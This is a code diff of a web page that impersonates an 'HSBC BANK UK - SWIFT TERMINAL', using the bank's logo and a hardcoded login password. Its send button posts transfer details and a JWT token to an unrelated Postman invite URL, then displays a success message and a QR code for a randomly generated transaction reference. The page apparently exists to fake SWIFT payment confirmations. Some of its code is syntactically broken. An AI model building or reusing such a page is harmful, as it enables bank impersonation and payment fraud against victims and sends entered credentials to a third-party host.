@@ -1,136 +1,166 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>HSBC SWIFT TERMINAL</title>
+  <meta charset="UTF-8">
+  <title>HSBC BANK UK - SWIFT TERMINAL</title>
   <style>
-    body { background-color: black; color: #00FF00; font-family: monospace; padding: 20px; }
+    body { background: black; color: #00FF00; font-family: monospace; margin: 0; padding: 0; }
+    header {
+      display: flex; align-items: center; justify-content: space-between;
+      background: #111; padding: 10px 20px; border-bottom: 1px solid #00FF00;
+    }
+    header img { height: 40px; }
+    .container { padding: 20px; }
     input, select, button, textarea {
       background: black; color: #00FF00; border: 1px solid #00FF00;
       padding: 5px; margin: 5px 0; font-family: monospace;
     }
-    #terminal, #formArea, #tracker, #excelBtn { display: none; }
-    .terminal-box {
-      border: 1px solid #00FF00; padding: 10px; height: 300px; overflow-y: auto;
+    .terminal {
+      border: 1px solid #00FF00; padding: 10px; height: 250px; overflow-y: auto;
+      margin-top: 15px;
     }
+    .message { margin: 4px 0; white-space: pre-wrap; }
+    canvas { margin-top: 10px; }
   </style>
 </head>
-<body>
 
-<h2>HSBC BANK UK - SWIFT TERMINAL</h2>
-<input type="password" id="pass" placeholder="Enter Password" />
-<button onclick="checkLogin()">Login</button>
+  <body>
+    <div id="login" style="padding:20px;">
+      <h2>HSBC BANK UK :: SWIFT TERMINAL LOGIN</h2>
+      <input type="password" id="pass" placeholder="Enter terminal password" />
+      <button onclick="login()">Access</button>
+    </div>
+  
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/6/6b/HSBC_logo_%282018%29.svg/320px-HSBC_logo_%282018%29.svg.png" alt="HSBC Logo">
+    <h2>HSBC BANK UK :: SWIFT TERMINAL</h2>
+  </header>
 
-<div id="formArea">
-  <select id="type">
-    <option value="MT103">MT103</option>
-    <option value="MT199">MT199</option>
-    <option value="MT799">MT799</option>
-    <option value="MT760">MT760</option>
-  </select><br>
-  Ref: <input id="ref" /><br>
-  Sender: <input id="from" /><br>
-  Receiver: <input id="to" /><br>
-  IBAN: <input id="iban" /><br>
-  Amount: <input id="amt" /><br>
-  Message: <textarea id="msg"></textarea><br>
-  JWT Token: <input id="jwt" /><br>
-  <button onclick="sendMsg()">Send SWIFT</button>
-</div>
+  <div class="container">
+    <select id="messageType" onchange="toggleForm()">
+      <option value="MT103">MT103</option>
+      <option value="MT199">MT199</option>
+      <option value="MT799">MT799</option>
+      <option value="MT760">MT760</option>
+      <option value="MT940">MT940</option>
+    </select><br>
 
-<div id="tracker">
-  Track UETR: <input id="uetr" />
-  <button onclick="track()">Track</button>
-</div>
+    <input id="ref" placeholder="Reference" /><br>
+    <input id="sender" placeholder="Sender Name" /><br>
+    <input id="receiver" placeholder="Receiver Name" /><br>
+    <input id="iban" placeholder="Receiver IBAN" /><br>
+    <input id="amount" placeholder="Amount (EUR)" /><br>
+    <textarea id="details" placeholder="Message Content (For MT199/799/760/940)"></textarea><br>
+    <input id="jwt" placeholder="JWT Token" /><br>
 
-<div class="terminal-box" id="terminal"></div>
-<button id="excelBtn" onclick="exportExcel()">Export Excel</button>
-<script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script>
-<script>
-  const PASSWORD = "Mohsen115960";
-  let history = [];
+    <button onclick="sendMessage()">Send Message (with JWT)</button>
+    <button onclick="trackUETR()">Track UETR</button>
+    <button onclick="exportExcel()">Export Excel</button>
 
-  function checkLogin() {
-    const p = document.getElementById("pass").value;
-    if (p === PASSWORD) {
-      document.getElementById("formArea").style.display = "block";
-      document.getElementById("terminal").style.display = "block";
-      document.getElementById("tracker").style.display = "block";
-      document.getElementById("excelBtn").style.display = "inline-block";
-      document.getElementById("pass").style.display = "none";
-      document.querySelector("button").style.display = "none";
-    } else {
-      alert("Wrong password");
+    <div class="terminal" id="terminal"></div>
+    <canvas id="qrcode"></canvas>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  
+  <script>
+    const PASSWORD = "swift123";
+    function login() {
+      const p = document.getElementById("pass").value;
+      if (p === PASSWORD) {
+        document.getElementById("login").style.display = "none";
+        document.body.querySelector(".container").style.display = "block";
+      } else {
+        alert("Invalid password");
+      }
     }
-  }
+    document.body.onload = () => {
+      document.body.querySelector(".container").style.display = "none";
+    };
+  
+    let lastUETR = "";
+    const history = [];
 
-  function generateUETR() {
-    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-      var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
-      return v.toString(16);
-    });
-  }
-
-  function log(text) {
-    const box = document.getElementById("terminal");
-    box.innerHTML += text + "\\n";
-    box.scrollTop = box.scrollHeight;
-  }
-
-  function sendMsg() {
-    const type = document.getElementById("type").value;
-    const ref = document.getElementById("ref").value;
-    const from = document.getElementById("from").value;
-    const to = document.getElementById("to").value;
-    const iban = document.getElementById("iban").value;
-    const amt = document.getElementById("amt").value;
-    const msg = document.getElementById("msg").value;
-    const jwt = document.getElementById("jwt").value;
-    const uetr = generateUETR();
-
-    const payload = { type, ref, from, to, iban, amt, msg, uetr };
-    history.push(payload);
-
-    log(> Sending ${type}...\nRef: ${ref}\nUETR: ${uetr});
-    
-    fetch("https://app.getpostman.com/join-team?invite_code=326866cd39f3448091cd38cfe50f4f1613c0e98b430f5336bb45da030394cebc&target_code=0374001f18310f0c4b9d4844073009c9", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer " + jwt
-      },
-      body: JSON.stringify(payload)
-    }).then(res => {
-      log("> Message Sent.");
-      document.getElementById("uetr").value = uetr;
-    }).catch(() => {
-      log("> ERROR sending message.");
-    });
-  }
-function track() {
-    const uetr = document.getElementById("uetr").value;
-    if (!uetr) {
-      log("> No UETR to track.");
-      return;
+    function toggleForm() {
+      const type = document.getElementById("messageType").value;
+      document.getElementById("iban").style.display = (type === "MT103") ? "block" : "none";
+      document.getElementById("amount").style.display = (type === "MT103") ? "block" : "none";
+      document.getElementById("details").style.display = (type !== "MT103") ? "block" : "none";
     }
 
-    fetch("https://ohmyfin.ai/wire-transfer", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ uetr })
-    }).then(r => r.json()).then(data => {
-      log("> UETR Status:\n" + JSON.stringify(data));
-    }).catch(() => {
-      log("> Error tracking UETR.");
-    });
-  }
+    function generateUETR() {
+      return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+        (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
+    }
 
-  function exportExcel() {
-    const ws = XLSX.utils.json_to_sheet(history);
-    const wb = XLSX.utils.book_new();
-    XLSX.utils.book_append_sheet(wb, ws, "SWIFT History");
-    XLSX.writeFile(wb, "swift_history.xlsx");
-  }
-</script>
+    function log(msg) {
+      const div = document.createElement("div");
+      div.className = "message"; div.textContent = msg;
+      const term = document.getElementById("terminal");
+      term.appendChild(div); term.scrollTop = term.scrollHeight;
+    }
+
+    function sendMessage() {
+      const type = document.getElementById("messageType").value;
+      const ref = document.getElementById("ref").value;
+      const sender = document.getElementById("sender").value;
+      const receiver = document.getElementById("receiver").value;
+      const iban = document.getElementById("iban").value;
+      const amount = document.getElementById("amount").value;
+      const details = document.getElementById("details").value;
+      const jwt = document.getElementById("jwt").value;
+
+      lastUETR = generateUETR();
+      const payload = { type, ref, sender, receiver, iban, amount, message: details, uetr: lastUETR };
+      history.push(payload);
+      log(`> Sending ${type}...
+> Ref: ${ref}
+> UETR: ${lastUETR}`);
+
+      fetch("https://app.getpostman.com/join-team?invite_code=326866cd39f3448091cd38cfe50f4f1613c0e98b430f5336bb45da030394cebc&target_code=0374001f18310f0c4b9d4844073009c9", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer " + jwt
+        },
+        body: JSON.stringify(payload)
+      }).then(res => {
+        log("> Message sent successfully.");
+        QRCode.toCanvas(document.getElementById("qrcode"), lastUETR, err => {
+          if (err) console.error(err);
+        });
+        pollUETR();
+      }).catch(err => {
+        log("> ERROR sending message.");
+      });
+    }
+
+    function trackUETR() {
+      if (!lastUETR) return log("> No UETR to track.");
+      fetch("https://ohmyfin.ai/wire-transfer", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ uetr: lastUETR })
+      }).then(r => r.json()).then(d => {
+        log("> UETR STATUS:
+" + JSON.stringify(d));
+      });
+    }
+
+    function pollUETR() {
+      setInterval(() => {
+        trackUETR();
+      }, 10000);
+    }
+
+    function exportExcel() {
+      const ws = XLSX.utils.json_to_sheet(history);
+      const wb = XLSX.utils.book_new();
+      XLSX.utils.book_append_sheet(wb, ws, "SWIFT_MESSAGES");
+      XLSX.writeFile(wb, "swift_history.xlsx");
+    }
+  </script>
 </body>
 </html>
